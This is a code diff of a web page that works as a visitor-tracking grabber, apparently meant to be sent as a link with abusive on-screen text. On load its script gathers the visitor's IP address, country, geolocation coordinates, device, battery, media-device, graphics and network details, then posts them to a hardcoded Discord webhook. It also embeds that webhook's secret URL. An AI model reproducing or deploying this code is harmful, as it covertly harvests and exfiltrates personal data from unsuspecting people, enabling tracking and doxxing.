@@ -3,17 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Collection</title>
+    <title>Get Fucked</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        h1 {
+            margin-top: 20px;
+        }
+
+        audio {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Collecting Data...</h1>
+    <h1>DUMBFUCK</h1>
     
-    <!-- Audio element -->
-    <audio id="audioElement" src="h.mp3"></audio>
+    <audio id="audioElement" src="h.mp3" autoplay muted></audio>
 
     <script>
-        // Function to detect the operating system
-        function getOS() {
+        async function getOS() {
             const platform = navigator.platform.toLowerCase();
             if (platform.includes('win')) return 'Windows';
             if (platform.includes('mac')) return 'MacOS';
@@ -23,73 +39,215 @@
             return 'Unknown';
         }
 
-        // Function to get the IP address and geolocation data
-        function getIPAddress(callback) {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://api.ipify.org?format=json', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    const response = JSON.parse(xhr.responseText);
-                    const ip = response.ip;
+        async function getIPAddress() {
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://api.ipify.org?format=json', true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+                        const response = JSON.parse(xhr.responseText);
+                        const ip = response.ip;
 
-                    // Get geolocation data
-                    const geoXhr = new XMLHttpRequest();
-                    geoXhr.open('GET', `https://ipapi.co/${ip}/json/`, true);
-                    geoXhr.onreadystatechange = function() {
-                        if (geoXhr.readyState == 4 && geoXhr.status == 200) {
-                            const geoResponse = JSON.parse(geoXhr.responseText);
-                            const country = geoResponse.country_name;
-                            const continent = geoResponse.continent_code;
-                            callback(ip, country, continent);
-                        }
-                    };
-                    geoXhr.send();
-                }
-            };
-            xhr.send();
+                        const geoXhr = new XMLHttpRequest();
+                        geoXhr.open('GET', `https://ipapi.co/${ip}/json/`, true);
+                        geoXhr.onreadystatechange = function() {
+                            if (geoXhr.readyState == 4 && geoXhr.status == 200) {
+                                const geoResponse = JSON.parse(geoXhr.responseText);
+                                const country = geoResponse.country_name;
+                                const continent = geoResponse.continent_code;
+                                resolve({ ip, country, continent });
+                            }
+                        };
+                        geoXhr.send();
+                    }
+                };
+                xhr.send();
+            });
         }
 
-        // Send the collected data to the Discord webhook
-        function sendData(ip, country, continent) {
+        async function getBatteryStatus() {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            } catch (error) {
+                console.error("Battery status retrieval failed: ", error);
+                return {
+                    level: "Unknown",
+                    charging: "Unknown"
+                };
+            }
+        }
+
+        async function collectData() {
+            const ipData = await getIPAddress();
+            const batteryData = await getBatteryStatus();
+
+            const mediaDevices = await navigator.mediaDevices.enumerateDevices();
+            const webGLData = getWebGLData();
+
+            return {
+                ...ipData,
+                userAgent: navigator.userAgent,
+                currentURL: window.location.href,
+                pageLoadTime: window.performance.timing.loadEventEnd - window.performance.timing.navigationStart,
+                networkInformation: navigator.connection ? {
+                    downlink: navigator.connection.downlink,
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt
+                } : 'Unknown',
+                networkType: navigator.connection ? navigator.connection.type : 'Unknown',
+                browserWindowSize: `${window.outerWidth}x${window.outerHeight}`,
+                screenDPI: window.devicePixelRatio * 96,
+                OSArchitecture: navigator.platform.includes('Win64') ? '64-bit' : '32-bit',
+                platformDetails: navigator.platform,
+                deviceOrientation: window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape',
+                touchEventsSupported: 'ontouchstart' in window,
+                hardwarePlatform: navigator.hardwareConcurrency || 'Unknown',
+                geolocationCoordinates: (await getGeolocation()) || 'Unavailable',
+                languagePreferences: navigator.languages.join(', '),
+                systemFonts: getSystemFonts(),
+                geolocationAccuracy: (await getGeolocationAccuracy()) || 'Unknown',
+                indexedDBSupported: 'indexedDB' in window,
+                serviceWorkerStatus: 'serviceWorker' in navigator ? 'Supported' : 'Not Supported',
+                localStorageSupported: 'localStorage' in window,
+                sessionStorageSupported: 'sessionStorage' in window,
+                webRTCSupported: 'RTCPeerConnection' in window,
+                webAssemblySupported: 'WebAssembly' in window,
+                webSocketSupported: 'WebSocket' in window,
+                connectionSpeed: navigator.connection ? navigator.connection.downlink : 'Unknown',
+                batteryLevel: batteryData.level,
+                batteryCharging: batteryData.charging,
+                audioDevices: mediaDevices.filter(device => device.kind === 'audiooutput').map(device => device.label).join(', '),
+                videoDevices: mediaDevices.filter(device => device.kind === 'videoinput').map(device => device.label).join(', '),
+                systemLanguage: navigator.language,
+                windowFocusStatus: document.hasFocus(),
+                idleTime: getIdleTime(), // Placeholder function
+                screenOrientationAngle: window.screen.orientation ? window.screen.orientation.angle : 'Unknown',
+                fullscreenStatus: document.fullscreenElement ? 'Fullscreen' : 'Not Fullscreen',
+                touchPoints: navigator.maxTouchPoints,
+                mediaQueries: getMediaQueries(),
+                fileSystemAccessSupported: 'showOpenFilePicker' in window,
+                devicePixelRatio: window.devicePixelRatio,
+                vrSupported: 'VRDisplay' in window,
+                arSupported: 'XRSession' in window,
+                usbDevices: await getUSBDevices(), // Placeholder function
+                bluetoothDevices: await getBluetoothDevices(), // Placeholder function
+                cookiesEnabled: navigator.cookieEnabled,
+                defaultBrowser: await getDefaultBrowser(), // Placeholder function
+                webGLExtensions: getWebGLExtensions(),
+                documentCharset: document.characterSet,
+                serverTiming: getServerTiming(), // Placeholder function
+                connectionRTT: navigator.connection ? navigator.connection.rtt : 'Unknown',
+                webRTCICECandidate: await getWebRTCICECandidate(), // Placeholder function
+                screenOrientationLock: screen.orientation ? 'Supported' : 'Not Supported',
+                orientationLockStatus: screen.orientation ? screen.orientation.type : 'Unknown',
+                cssGridSupport: CSS.supports('display', 'grid'),
+                cssFlexSupport: CSS.supports('display', 'flex'),
+                es6Support: typeof Symbol !== 'undefined',
+                promisesSupport: typeof Promise !== 'undefined'
+            };
+        }
+
+        function getSystemFonts() {
+            // Placeholder: implement font detection if needed
+            return 'Unknown';
+        }
+
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => resolve(`${position.coords.latitude}, ${position.coords.longitude}`),
+                        () => resolve('Unavailable')
+                    );
+                } else {
+                    resolve('Unavailable');
+                }
+            });
+        }
+
+        function getGeolocationAccuracy() {
+            // Placeholder: accuracy not directly available
+            return 'Unknown';
+        }
+
+        function getMediaQueries() {
+            // Example media queries check
+            return {
+                'min-width: 600px': window.matchMedia('(min-width: 600px)').matches
+            };
+        }
+
+        function getWebGLData() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+                };
+            }
+            return {
+                renderer: 'Unknown',
+                vendor: 'Unknown'
+            };
+        }
+
+        function getWebGLExtensions() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            return gl ? gl.getSupportedExtensions().join(', ') : 'None';
+        }
+
+        function getUSBDevices() {
+            // Placeholder: USB API is not yet widely available
+            return Promise.resolve('Unavailable');
+        }
+
+        function getBluetoothDevices() {
+            // Placeholder: Bluetooth API is not yet widely available
+            return Promise.resolve('Unavailable');
+        }
+
+        function getDefaultBrowser() {
+            // Placeholder: No direct API for default browser detection
+            return Promise.resolve('Unknown');
+        }
+
+        function getServerTiming() {
+            // Placeholder: Server timing headers may not be available
+            return 'Unavailable';
+        }
+
+        function getWebRTCICECandidate() {
+            // Placeholder: ICE candidate data not directly available
+            return Promise.resolve('Unavailable');
+        }
+
+        function getIdleTime() {
+            // Placeholder: Implement a method to calculate idle time
+            return 'Unknown';
+        }
+
+        async function sendData() {
+            const data = await collectData();
             const xhr = new XMLHttpRequest();
             const url = 'https://discord.com/api/webhooks/1249043424020004865/iZguJoomM0MqkqlEf9lZKZ9eKJNgJGKTsjUzUSexCMOXXVjQ-Mh2uIGXQOmT9QQds3_s';
             xhr.open('POST', url, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
 
-            const data = JSON.stringify({
-                content: `IP Address: ${ip}
-Country: ${country}
-Continent: ${continent}
-Device: ${navigator.userAgent}
-Browser: ${navigator.appName}
-Screen Resolution: ${window.screen.width}x${window.screen.height}
-Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Operating System: ${getOS()}
-Language: ${navigator.language}
-Cookies Enabled: ${navigator.cookieEnabled}
-Online Status: ${navigator.onLine}
-Java Enabled: ${navigator.javaEnabled()}
-Referrer: ${document.referrer}
-Platform: ${navigator.platform}
-Vendor: ${navigator.vendor}`
+            const payload = JSON.stringify({
+                content: Object.entries(data).map(([key, value]) => `${key}: ${value}`).join('\n')
             });
 
-            xhr.send(data);
+            xhr.send(payload);
         }
 
-        // Play audio and collect IP address and geolocation data
-        window.onload = function() {
-            // Play the audio
-            const audioElement = document.getElementById('audioElement');
-            audioElement.play().catch(function(error) {
-                console.log("Audio playback failed: ", error);
-            });
-
-            // Collect IP address and then send all data
-            getIPAddress(function(ip, country, continent) {
-                sendData(ip, country, continent);
-            });
-        };
+        sendData();
     </script>
 </body>
 </html>
